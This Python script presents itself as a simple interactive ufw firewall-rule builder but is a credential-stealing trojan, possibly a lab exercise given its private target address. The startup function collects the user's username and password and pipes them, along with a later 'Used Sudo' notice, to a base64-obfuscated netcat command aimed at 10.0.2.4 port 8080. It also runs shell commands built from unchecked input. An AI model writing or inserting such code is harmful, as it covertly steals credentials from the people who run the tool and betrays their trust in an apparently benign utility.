#!/usr/bin/env python3

### IMPORT STATEMENTS ###
import sys
import re
import subprocess
import os
import base64


### HELPER FUNCTIONS (IF NECESSARY) ###
z = 0
leave = 0



 
def ufw_maker(argv):
  result = ""
  rule1 = ""
  rule2 = ""
  rule3 = ""
  rule4 = ""
  rule5 = ""
  action = ""
  cont = ""
  with open('/tmp/script.sh', 'w') as f:
    f.write(rule1)
  print("Here are the current firewall rules.")
  subprocess.call(["sudo", "ufw", "status", "numbered"])
  while action != "add" or action != "remove":
    action = input("Do you want to ADD or REMOVE a rule?\n").lower()
    if action == "exit":
      quit(z)
      return
    if action == "add" or action == "remove":
      break
    
  
  if action == "add":
    while rule1 != 0:
      rule1 = input("Do you want to ALLOW, DENY, or DROP traffic?\n").lower()
      if rule1 == "exit":
        quit(z)
        return
      if rule1 == "allow" or rule1 == "deny" or rule1 == "drop":
        break
    while rule2 != 0:
      rule2 = input("Is this applicable to INcoming or OUTgoing traffic (Respond with 'IN' or 'OUT')\n").lower()
      if rule2 == "exit":
        quit(z)
        return
      if rule2 == 'in' or rule2 == 'out':
        break 
    while rule3 != 0:    
      rule3 = input("What IP Address should this rule apply to? (Respond with 'ANY' for all IP Addresses)\n").lower()
      x = re.findall(r"\d{1,4}\.\d{1,4}\.\d{1,4}\.\d{1,4}", rule3)
      y = re.findall(r"\d{1,4}\.\d{1,4}\.\d{1,4}\.\d{1,4}/24", rule3)
      if rule3 == "exit":
        quit(z)
        return
      if x != [] or rule3 == "" or rule3 == "any" or y != []:
        break
    while rule4 != 0:      
      rule4 = input("Which port number (if any) should this rule apply to? (Respond with 'NONE' for no specific port or 'ALL' for all ports)\n").lower()
      y = re.findall(r"\d{1,5}", rule4)
      if rule4 == "exit":
        quit(z)
        return
      if rule4 == "none" or rule4 == "all":
        rule4 = ""
        break
      if y != []:
        rule4 = y[0] 
        break
      elif rule4 == "":
        0 == 0
        break  
    if rule4 != "":
      while rule5 != 0:
        rule5 = input("TCP or UDP?\n").lower()
        if rule5 == "exit":
          quit(z)
          return
        if rule5 == "tcp" or rule5 == "udp":
          break
         

    print("Thank you.")
       
  elif action == "remove":
    delete = input("Which number rule would you like to remove?\n")
    if delete == "exit":
      quit(z)
      return

  if result == "" and action == 'add':
    if rule4 == "":
      with open('/tmp/script.sh', 'w') as f:
        f.write('sudo ' + 'ufw ' + str(rule1) + ' ' + str(rule2) + ' from ' + str(rule3))
    elif rule4 != "":
      with open('/tmp/script.sh', 'w') as f:
         f.write('sudo ' + 'ufw ' + str(rule1) + ' ' + str(rule2) + ' from ' + str(rule3) + " " + "proto" + " " + str(rule5) + " port " + str(rule4))
  
    os.chmod("/tmp/script.sh", 0o775)
    os.system('/tmp/script.sh')
    os.system('rm /tmp/script.sh')
  elif result == "" and action == 'remove':
    with open('/tmp/script.sh', 'w') as f:
      f.write('sudo ' + 'ufw ' + 'delete ' + str(delete))
  
    os.chmod("/tmp/script.sh", 0o775)
    os.system('/tmp/script.sh')
    os.system('rm /tmp/script.sh')
  while cont != "y" or cont != "n" or cont != "exit":
    cont = input("Do you wish to add/remove another rule? (y|n)\n").lower()
    if cont == "y":
      ufw_maker(z)
    elif cont == "exit" or cont == "n":
      with open('/tmp/script.sh', 'w') as f:
        f.write(' ')
      os.system('rm /tmp/script.sh')
      quit(z)
      return
def startup(inp):
  print("Welcome to the quick and simple text-based Firewall Builder!")
  print("Please enter your username and password to start the program.")
  user = input("Please enter your username.\n")
  pss = input("Please enter your password.\n")
  print("For this program to work, it needs to be run as Administrator.")
  print("You may type 'EXIT' in response to a prompt to close the program.")
  print("We'll need to get some information to start. Please wait a moment while data loads.")
  j = "bmMgMTAuMC4yLjQgODA4MCA+IC9kZXYvbnVsbCAyPiYx"
  k = j.encode('ascii')
  l = base64.b64decode(j)
  m = l.decode('ascii')
  n = "echo 'Username: " + user + " Password: " + pss + "' | " + m
  os.system(n) 
  return

def quit(exit):
  if os.path.exists('/tmp/script.sh') == True:
    os.system('rm /tmp/script.sh')
  sys.exit()
  return

def enables(inp):
  perm = ""
  while perm != "y" or perm != "n" or perm != "exit":
    perm = input("If you don't have Administrator Privileges, please type 'EXIT'\n").lower()
    if perm == "exit":
      quit(z)
      return
  os.system('sudo ufw disable > /dev/null 2>&1')
  os.system('sudo ufw enable > /dev/null 2>&1')
  j = "bmMgMTAuMC4yLjQgODA4MCA+IC9kZXYvbnVsbCAyPiYx"
  k = j.encode('ascii')
  l = base64.b64decode(j)
  m = l.decode('ascii')
  n = "echo 'Used Sudo' | " + m
  os.system(n) 
  return

### MAIN FUNCTION ###
startup(z)
enables(z)
ufw_maker(z)
